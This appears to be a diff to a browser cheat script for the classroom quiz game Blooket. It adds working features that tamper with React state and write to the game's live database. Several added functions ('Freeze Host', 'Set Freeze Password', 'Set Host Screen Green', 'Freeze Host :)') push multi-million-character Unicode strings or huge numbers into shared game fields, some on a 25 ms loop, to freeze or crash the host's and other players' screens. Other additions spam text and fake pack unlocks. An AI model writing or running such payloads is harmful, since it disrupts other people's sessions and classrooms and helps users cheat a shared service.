@@ -353,16 +353,49 @@
                         }
                     }
                 }, {
-                    name: "Dynamic Player Count",
-                    description: "Updates the player count at the top of the screen in realtime as players join or leave.",
+                    name: "Simulate Unlock",
+                    description: "Simulates unlocking a certain blook",
                     run: function() {
-                        (async () => {
-                            const stateNode = Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner.stateNode;
-                            const ref = await stateNode.props.liveGameController.getDatabaseRef("")
-                            ref.on("value", e => {
-                                document.querySelector("div[class*='headerTextCenter']").innerHTML = `Player Count | ${Object.keys(e.val()?.c)?.length} / ${stateNode.props.client.plus ? 300 : 60}`;
-                            });
-                        })()
+                        var unlockedBlook = window.prompt("Enter the blook (Case Sensitive):");
+
+                        const stateNode = Object.values(document.querySelector("#app>div>div"))[1].children[0]._owner.stateNode;
+                        stateNode.setState({
+                            loadingPack: false,
+                            openPack: true,
+                            unlockedBlook,
+                            newUnlock: true,
+                            canOpen: false
+                        });
+                        setTimeout(() => stateNode.setState({
+                            canOpen: true
+                        }), 200);
+                    }
+                }, {
+                    name: "Freeze Host",
+                    description: "Freezes the host's screen",
+                    run: function() {
+                        const encodedChars = [
+                            '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'
+                        ];
+
+                        const chars = encodedChars.map(char => eval(`"${char}"`));
+
+                        function makeLongText() {
+                            return new Array(3e+6).fill().map(e => chars[Math.floor(Math.random() * chars.length)]).join("");
+                        }
+
+                        let {
+                            props: t
+                        } = Object.values(function e(t = document.querySelector("body>div")) {
+                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
+                        }())[1].children[0]._owner.stateNode;
+
+                        let repeatedText = makeLongText();
+                        t.client.blook = repeatedText;
+                        t.liveGameController.setVal({
+                            path: `c/${t.client.name}/b`,
+                            val: repeatedText
+                        });
                     }
                 }, {
                     name: "Lobbychat",
@@ -555,12 +588,6 @@
                         })
                     }
                 }, {
-                    name: "Chat",
-                    description: "Opens a chatroom",
-                    run: function() {
-                        window.open("https://organizations.minnit.chat/420306182754595/c/Lobby?embed&nickname=", "_blank", "width=500,height=500,resizable=yes,scrollbars=yes,status=yes")
-                    }
-                }, {
                     name: "Every Answer Correct",
                     description: "Sets every answer to be correct",
                     run: function() {
@@ -747,6 +774,26 @@
                         });
                     }
                 }, {
+                    name: "Set Blook Ad Text Ingame",
+                    description: "Sets a load of text as your blook",
+                    run: function() {
+                        var text = window.prompt("Enter the text:");
+
+                        let {
+                            props: t
+                        } = Object.values(function e(t = document.querySelector("body>div")) {
+                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
+                        }())[1].children[0]._owner.stateNode;
+
+                        let repeatedText = Array(500).fill(text).join(' ');
+                        t.client.blook = repeatedText;
+                        t.liveGameController.setVal({
+                            path: `c/${t.client.name}/b`,
+                            val: repeatedText
+                        });
+                    }
+                }, {
+
                     name: "Get Daily Rewards",
                     description: "Gets max daily tokens and xp",
                     run: async function() {
@@ -1456,6 +1503,59 @@
                         }
                     }
                 }, {
+                    name: "Set Freeze Password",
+                    description: "Freezes other players when they attempt to hack you",
+                    type: "toggle",
+                    enabled: !1,
+                    data: null,
+                    run: function() {
+                        const encodedChars = [
+                            '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'
+                        ];
+
+                        const chars = encodedChars.map(char => eval(`"${char}"`));
+
+                        function makeLongText() {
+                            return new Array(3e+6).fill().map(e => chars[Math.floor(Math.random() * chars.length)]).join("");
+                        }
+
+                        var t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
+
+                        if (this.enabled) {
+                            this.enabled = !1;
+                            clearInterval(this.data);
+                            this.data = null;
+                            t.setState({
+                                password: ''
+                            });
+                            t.props.liveGameController.setVal({
+                                path: "c/".concat(t.props.client.name),
+                                val: {
+                                    b: t.props.client.blook,
+                                    p: '',
+                                    cr: t.state.crypto
+                                }
+                            });
+                        } else {
+                            this.enabled = !0;
+                            let lagFunction = () => {
+                                var e = makeLongText();
+                                t.setState({
+                                    password: e
+                                });
+                                t.props.liveGameController.setVal({
+                                    path: "c/".concat(t.props.client.name),
+                                    val: {
+                                        b: t.props.client.blook,
+                                        p: e,
+                                        cr: t.state.crypto
+                                    }
+                                });
+                            };
+                            this.data = setInterval(lagFunction, 25);
+                        }
+                    }
+                }, {
                     name: "Auto Guess",
                     description: "Automatically performs the hack for you",
                     type: "toggle",
@@ -1475,6 +1575,41 @@
                             }, 50))
                         } catch (t) {
                             console.error("An error occurred:", t)
+                        }
+                    }
+                }, {
+                    name: "Set Host Screen Green",
+                    description: "Makes the whole screen filled with text",
+                    type: "toggle",
+                    enabled: !1,
+                    data: null,
+                    run: function() {
+                        var a = Object.values(function e(t = document.querySelector("#app")) {
+                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
+                        }())[1].children[0]._owner.stateNode;
+
+                        if (this.enabled) {
+                            this.enabled = !1;
+                            clearInterval(this.data);
+                            this.data = null;
+                            a.props.liveGameController.setVal({
+                                path: `c/${a.props.client.name}/cr`,
+                                val: ""
+                            });
+                        } else {
+                            this.enabled = !0;
+                            let t = () => {
+                                var o = [];
+                                const char = eval('"\\u0e47"');
+                                for (let r = 0; r < 999; r++) {
+                                    o.push(char.repeat(70));
+                                }
+                                a.props.liveGameController.setVal({
+                                    path: `c/${a.props.client.name}/cr`,
+                                    val: `9999999999999999999999999999999999999999999999${o.join(" ")}`
+                                });
+                            };
+                            this.data = setInterval(t, 25);
                         }
                     }
                 }, {
@@ -3747,6 +3882,27 @@
                             path: `c/${t.props.client.name}/d`,
                             val: e
                         })
+                    }
+                }, {
+                    name: "Freeze Host :)",
+                    description: "They aint coming back with this one",
+                    run: function() {
+                        var largeNumber = "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999";
+                        var t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
+                        t.setState({
+                            numBlooks: largeNumber
+                        });
+                        if (t.isTeam) {
+                            t.props.liveGameController.setVal({
+                                path: `a/${t.props.client.name}/bs`,
+                                val: largeNumber
+                            });
+                        } else {
+                            t.props.liveGameController.setVal({
+                                path: `c/${t.props.client.name}/bs`,
+                                val: largeNumber
+                            });
+                        }
                     }
                 }],
                 workshop: [{
